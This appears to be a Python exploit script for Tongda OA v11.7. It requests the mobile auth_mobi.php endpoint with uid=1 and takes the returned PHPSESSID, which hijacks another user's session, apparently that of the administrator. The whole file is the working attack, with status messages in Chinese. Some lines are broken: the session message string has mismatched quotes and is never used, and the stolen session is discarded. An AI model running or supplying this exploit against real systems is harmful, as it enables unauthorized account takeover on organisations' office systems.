import re
import time
import requests

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url=target_url+"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
    success_msg = now_time() + '[SUCCESS]  目标存在通达OA任意用户的登录漏洞'
    shell_msg = now_time() + 'session为: {}".format(PHPSESSION)'
    warning_msg = now_time() + '[WARNING]  通达OA_A任意用户的登录漏洞不存在'
    error_msg = now_time() + '[通达OA_v11_7_在线用户登录][ERROR]  目标请求失败 '
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=30)
        page=response.text
        if "RELOGIN" in page and response.status_code == 200:
            return warning_msg
        elif response.status_code == 200 and page=="":
            PHPSESSION=re.findall(r'PHPSESSID=(.*?);', str(response.headers))
            return success_msg
        else:
            return warning_msg
    except:
        return error_msg